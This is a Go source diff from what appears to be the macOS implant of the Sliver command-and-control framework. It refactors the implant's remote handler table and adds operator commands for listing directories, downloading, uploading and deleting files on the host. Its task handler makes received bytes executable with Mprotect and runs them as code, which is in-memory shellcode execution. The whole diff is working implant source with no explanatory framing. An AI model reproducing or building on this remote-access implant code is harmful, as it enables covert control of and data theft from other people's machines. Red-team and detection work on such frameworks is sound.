@@ -6,7 +6,7 @@ import (
 	// {{else}}
 	// {{end}}
 
-	pb "sliver/protobuf"
+	pb "sliver/protobuf/sliver"
 	"syscall"
 	"unsafe"
 
@@ -14,27 +14,36 @@ import (
 )
 
 var (
-	darwinHandlers = map[string]interface{}{
-		"task":       taskHandler,
-		"remoteTask": remoteTaskHandler,
-		"psReq":      psHandler,
-		"ping":       pingHandler,
-		"kill":       killHandler,
+	darwinHandlers = map[uint32]RPCHandler{
+		pb.MsgTask:       taskHandler,
+		pb.MsgRemoteTask: remoteTaskHandler,
+
+		pb.MsgPsListReq:   psHandler,
+		pb.MsgPing:        pingHandler,
+		pb.MsgKill:        killHandler,
+		pb.MsgDirListReq:  dirListHandler,
+		pb.MsgDownloadReq: downloadHandler,
+		pb.MsgUploadReq:   uploadHandler,
+		pb.MsgCdReq:       cdHandler,
+		pb.MsgPwdReq:      pwdHandler,
+		pb.MsgRmReq:       rmHandler,
+		pb.MsgMkdirReq:    mkdirHandler,
 	}
 )
 
-func getSystemHandlers() map[string]interface{} {
+func getSystemHandlers() map[uint32]RPCHandler {
 	return darwinHandlers
 }
 
 // Adapted/stolen from: https://github.com/lesnuages/hershell/blob/master/shell/shell_default.go#L48
-func taskHandler(send chan *pb.Envelope, data []byte) {
+func taskHandler(data []byte, resp RPCResponse) {
 	dataAddr := uintptr(unsafe.Pointer(&data[0]))
 	page := getPage(dataAddr)
 	syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
 	dataPtr := unsafe.Pointer(&data)
 	funcPtr := *(*func())(unsafe.Pointer(&dataPtr))
 	go funcPtr()
+	resp([]byte{}, nil)
 }
 
 // Get the page containing the given pointer
@@ -43,13 +52,15 @@ func getPage(p uintptr) []byte {
 	return (*(*[0xFFFFFF]byte)(unsafe.Pointer(p & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
 }
 
-func remoteTaskHandler(send chan *pb.Envelope, data []byte) {
+func remoteTaskHandler(data []byte, resp RPCResponse) {
 	remoteTask := &pb.RemoteTask{}
 	err := proto.Unmarshal(data, remoteTask)
 	if err != nil {
 		// {{if .Debug}}
 		log.Printf("error decoding message: %v", err)
 		// {{end}}
+		resp([]byte{}, err)
 		return
 	}
+	resp([]byte{}, err)
 }
